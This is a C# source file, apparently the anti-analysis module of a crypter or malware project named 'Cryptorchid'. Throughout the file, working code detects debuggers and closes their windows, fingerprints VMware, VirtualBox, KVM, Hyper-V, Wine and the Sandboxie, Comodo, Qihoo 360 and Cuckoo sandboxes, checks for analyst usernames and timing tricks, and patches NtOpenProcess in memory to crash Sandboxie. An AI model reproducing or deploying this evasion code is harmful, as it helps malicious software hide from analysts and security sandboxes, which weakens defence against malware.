using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Cryptorchid
{
    public class AntiVirtualization
    {
        [DllImport("kernelbase.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lib);

        [DllImport("kernelbase.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr ModuleHandle, string Function);

        [DllImport("kernelbase.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(SafeHandle hProcess, IntPtr BaseAddress, byte[] Buffer, uint size, int NumOfBytes);

        [DllImport("kernelbase.dll", SetLastError = true)]
        private static extern bool IsProcessCritical(SafeHandle hProcess, ref bool BoolToCheck);

        [DllImport("ucrtbase.dll", SetLastError = true)]
        private static extern IntPtr fopen(string filename, string mode);

        [DllImport("ucrtbase.dll", SetLastError = true)]
        private static extern int fclose(IntPtr filestream);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLengthA(IntPtr HWND);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextA(IntPtr HWND, StringBuilder WindowText, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();


        public static bool Execute()
        {

            // AntiDebug

            if (AntiVirtualization.GetForegroundWindowAntiDebug())
            {
                Console.WriteLine("Foreground Window debugger detected.");
            }

            if (AntiVirtualization.FindWindowAntiDebug())
            {
                Console.WriteLine("Window debugger detected.");
            }


            // AntiVM

            if (AntiVirtualization.CheckForVMwareAndVirtualBox())
            {
                Console.WriteLine("Hypervisor Detected.");
            }

            if (AntiVirtualization.BadVMFilesDetection())
            {
                Console.WriteLine("Hypervisor Files Detected.");
            }

            if (AntiVirtualization.BadVMProcessNames())
            {
                Console.WriteLine("Hypervisor  Process Detected.");
            }

            if (AntiVirtualization.PortConnectionAntiVM())
            {
                Console.WriteLine("Port Connection Anti-VM detected.");
            }

            if (AntiVirtualization.CheckDevices())
            {
                Console.WriteLine("Device Check Anti-VM detected.");
            }

            if (AntiVirtualization.CheckForBlacklistedNames())
            {
                Console.WriteLine("Blacklisted Names detected.");
            }

            if (AntiVirtualization.CheckForKVM())
            {
                Console.WriteLine("KVM detected.");
            }

            if (AntiVirtualization.IsWinePresent())
            {
                Console.WriteLine("Wine detected.");
            }

            if (AntiVirtualization.IsEmulationPresent())
            {
                Console.WriteLine("Emulation detected.");
            }

            if (AntiVirtualization.IsSandboxiePresent())
            {
                Console.WriteLine("Sandboxie detected.");
            }

            if (AntiVirtualization.IsComodoSandboxPresent())
            {
                Console.WriteLine("Comodo Sandbox detected.");
            }

            if (AntiVirtualization.IsQihoo360SandboxPresent())
            {
                Console.WriteLine("Qihoo 360 Sandbox detected.");
            }

            if (AntiVirtualization.IsCuckooSandboxPresent())
            {
                Console.WriteLine("Cuckoo Sandbox detected.");
            }

            return PortConnectionAntiVM() || CheckDevices() || CheckForBlacklistedNames() ||
       CheckForKVM() || IsWinePresent() || IsEmulationPresent() ||
       IsSandboxiePresent() || IsComodoSandboxPresent() ||
       IsQihoo360SandboxPresent() || IsCuckooSandboxPresent() || BadVMFilesDetection() || BadVMProcessNames() || CheckForVMwareAndVirtualBox();
        }

        public static bool FindWindowAntiDebug()
        {
            Process[] GetProcesses = Process.GetProcesses();
            foreach (Process GetWindow in GetProcesses)
            {
                string[] BadWindowNames = { "x32dbg", "x64dbg", "windbg", "ollydbg", "dnspy", "immunity debugger", "hyperdbg", "cheat engine", "cheatengine", "ida" };
                foreach (string BadWindows in BadWindowNames)
                {
                    if (GetWindow.MainWindowTitle.ToLower().Contains(BadWindows))
                    {
                        GetWindow.Close();
                        return true;
                    }
                }
            }
            return false;
        }

        public static bool GetForegroundWindowAntiDebug()
        {
            string[] BadWindowNames = { "x32dbg", "x64dbg", "windbg", "ollydbg", "dnspy", "immunity debugger", "hyperdbg", "debug", "debugger", "cheat engine", "cheatengine", "ida" };
            IntPtr HWND = GetForegroundWindow();
            if (HWND != IntPtr.Zero)
            {
                int WindowLength = GetWindowTextLengthA(HWND);
                if (WindowLength != 0)
                {
                    StringBuilder WindowName = new StringBuilder(WindowLength + 1);
                    GetWindowTextA(HWND, WindowName, WindowLength + 1);
                    foreach (string BadWindows in BadWindowNames)
                    {
                        if (WindowName.ToString().ToLower().Contains(BadWindows))
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        public static bool IsSandboxiePresent()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            return false;
        }

        public static bool IsComodoSandboxPresent()
        {
            if (GetModuleHandle("cmdvrt32.dll").ToInt32() != 0 || GetModuleHandle("cmdvrt64.dll").ToInt32() != 0)
                return true;
            return false;
        }

        public static bool IsQihoo360SandboxPresent()
        {
            if (GetModuleHandle("SxIn.dll").ToInt32() != 0)
                return true;
            return false;
        }

        public static bool IsCuckooSandboxPresent()
        {
            if (GetModuleHandle("cuckoomon.dll").ToInt32() != 0)
                return true;
            return false;
        }

        public static bool IsEmulationPresent()
        {
            long Tick = Environment.TickCount;
            Thread.Sleep(500);
            long Tick2 = Environment.TickCount;
            if (((Tick2 - Tick) < 500L))
            {
                return true;
            }
            return false;
        }

        public static bool IsWinePresent()
        {
            IntPtr ModuleHandle = GetModuleHandle("kernel32.dll");
            if (GetProcAddress(ModuleHandle, "wine_get_unix_file_name").ToInt32() != 0)
                return true;
            return false;
        }

        public static bool CheckForVMwareAndVirtualBox()
        {
            using (ManagementObjectSearcher ObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (ManagementObjectCollection ObjectItems = ObjectSearcher.Get())
                {
                    foreach (ManagementBaseObject Item in ObjectItems)
                    {
                        string ManufacturerString = Item["Manufacturer"].ToString().ToLower();
                        string ModelName = Item["Model"].ToString();
                        if ((ManufacturerString == "microsoft corporation" && ModelName.ToUpperInvariant().Contains("VIRTUAL") || ManufacturerString.Contains("vmware")))
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        public static bool CheckForKVM()
        {
            string[] BadDriversList = { "balloon.sys", "netkvm.sys", "vioinput", "viofs.sys", "vioser.sys" };
            foreach (string Drivers in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*"))
            {
                foreach (string BadDrivers in BadDriversList)
                {
                    if (Drivers.Contains(BadDrivers))
                    {
                        return true;
                    }
                }
            }

            return false;
        }

        public static bool CheckForHyperV()
        {
            ServiceController[] GetServicesOnSystem = ServiceController.GetServices();
            foreach (ServiceController CompareServicesNames in GetServicesOnSystem)
            {
                string[] Services = { "vmbus", "VMBusHID", "hyperkbd" };
                foreach (string ServicesToCheck in Services)
                {
                    if (CompareServicesNames.ServiceName.Contains(ServicesToCheck))
                        return true;
                }
            }
            return false;
        }

        public static bool CheckForBlacklistedNames()
        {
            string[] BadNames = { "Johnson", "Miller", "malware", "maltest", "CurrentUser", "Sandbox", "virus", "John Doe", "test user", "sand box", "WDAGUtilityAccount" };
            string Username = Environment.UserName.ToLower();
            foreach (string BadUsernames in BadNames)
            {
                if (Username == BadUsernames.ToLower())
                {
                    return true;
                }
            }
            return false;
        }

        public static bool BadVMFilesDetection()
        {
            try
            {
                string[] BadFileNames = { "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys", "vboxogl.dll" };
                string[] BadDirs = { @"C:\Program Files\VMware", @"C:\Program Files\oracle\virtualbox guest additions" };
                foreach (string System32File in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System)))
                {
                    try
                    {
                        foreach (string BadFileName in BadFileNames)
                        {
                            if (File.Exists(System32File) && Path.GetFileName(System32File).ToLower() == BadFileName.ToLower())
                            {
                                return true;
                            }
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }

                foreach (string BadDir in BadDirs)
                {
                    if (Directory.Exists(BadDir.ToLower()))
                    {
                        return true;
                    }
                }
            }
            catch
            {

            }
            return false;
        }

        public static bool BadVMProcessNames()
        {
            try
            {
                // 'vmware' if we know the env doesnt user it at all
                // 'virtualbox'  if we know the env doesnt user it at all
                // "VmwareAutostartService" if we know the env doesnt user it at all
                string[] BadProcessNames = { "vboxservice", "VGAuthService", "VmwareAutostartService", "vmware", "virtualbox", "vmusrvc", "qemu-ga" };
                foreach (Process Processes in Process.GetProcesses())
                {
                    foreach (string BadProcessName in BadProcessNames)
                    {
                        if (Processes.ProcessName == BadProcessName)
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }
            return false;
        }

        public static bool PortConnectionAntiVM()
        {
            if (new ManagementObjectSearcher("SELECT * FROM Win32_PortConnector").Get().Count == 0)
                return false;
            return true;
        }

        public static void CrashingSandboxie() //Only use if running as x86
        {
            if (!Environment.Is64BitProcess)
            {
                byte[] UnHookedCode = { 0xB8, 0x26, 0x00, 0x00, 0x00 };
                IntPtr NtdllModule = GetModuleHandle("ntdll.dll");
                IntPtr NtOpenProcess = GetProcAddress(NtdllModule, "NtOpenProcess");
                WriteProcessMemory(Process.GetCurrentProcess().SafeHandle, NtOpenProcess, UnHookedCode, 5, 0);
                try
                {
                    Process[] GetProcesses = Process.GetProcesses();
                    foreach (Process ProcessesHandle in GetProcesses)
                    {
                        bool DoingSomethingWithHandle = false;
                        try
                        {
                            IsProcessCritical(ProcessesHandle.SafeHandle, ref DoingSomethingWithHandle);
                        }
                        catch
                        {
                            continue;
                        }
                    }
                }
                catch
                {

                }
            }
        }

        public static bool CheckDevices()
        {
            string[] Devices = { "\\\\.\\pipe\\cuckoo", "\\\\.\\HGFS", "\\\\.\\vmci", "\\\\.\\VBoxMiniRdrDN", "\\\\.\\VBoxGuest", "\\\\.\\pipe\\VBoxMiniRdDN", "\\\\.\\VBoxTrayIPC", "\\\\.\\pipe\\VBoxTrayIPC" };
            foreach (string Device in Devices)
            {
                try
                {
                    IntPtr File = fopen(Device, "r");
                    if (File != IntPtr.Zero)
                    {
                        fclose(File);
                        return true;
                    }
                }
                catch
                {
                    continue;
                }
            }
            return false;
        }
    }
}
